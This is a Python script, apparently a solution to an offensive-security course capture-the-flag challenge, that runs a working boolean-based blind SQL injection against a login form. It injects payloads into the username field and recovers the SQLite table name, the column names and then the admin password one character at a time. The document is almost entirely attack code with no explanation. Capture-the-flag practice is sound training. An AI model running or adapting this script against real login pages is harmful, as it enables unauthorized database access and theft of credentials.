import requests

cookies = {'CHALBROKER_USER_ID': 'os2178'}
alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890!_' + '{' + '}'

''' Code for finding the name of the table '''
count = 1
table_name = ''
endOfString = False
while(True):
    if endOfString:
        break
    for i in alphabet:
        # print(count, i)
        payload = {'username': "admin' AND (SUBSTR((SELECT tbl_name FROM sqlite_schema WHERE type='table' LIMIT 1 OFFSET 0), 1, " + str(count) + ")='"
                    + table_name + i + "')--", 'password': "password"}
        r = requests.post('http://offsec-chalbroker.osiris.cyber.nyu.edu:1505/login', cookies=cookies, data=payload) 
        if i == 'z':
            endOfString = True
        if not 'Invalid' in r.text:
            count += 1
            table_name += i
            print(table_name)
            break
print(table_name)

''' Code for finding the names of the columns '''
for offset in range(3):
    count = 1
    column_name = ''
    endOfString = False
    while(True):
        if endOfString:
            break
        for i in alphabet:
            print(count, i)
            payload = {'username': "admin' AND (SUBSTR((SELECT name FROM pragma_table_info('users') LIMIT 1 OFFSET "
                        + str(offset) + "), 1, " + str(count) + ")='"
                        + column_name + i + "')--", 'password': "password"}
            r = requests.post('http://offsec-chalbroker.osiris.cyber.nyu.edu:1505/login', cookies=cookies, data=payload) 
            if i == 'z':
                endOfString = True
            if not 'Invalid' in r.text:
                count += 1
                column_name += i
                print(column_name)
                break
    print(column_name)

''' Code for finding the flag! '''
count = 1
flag = ''
endOfString = False
while(True):
    if endOfString:
        break
    for i in alphabet:
        print(count, i)
        payload = {'username': "admin' AND (SUBSTR((SELECT password FROM Users WHERE username='admin' LIMIT 1 OFFSET 0), 1, "
                    + str(count) + ")='" + flag + i + "')--", 'password': "password"}
        r = requests.post('http://offsec-chalbroker.osiris.cyber.nyu.edu:1505/login', cookies=cookies, data=payload)
        if i == '}':
            endOfString = True
        if not 'Invalid' in r.text:
            count += 1
            flag += i
            print(flag)
            break
print(flag)
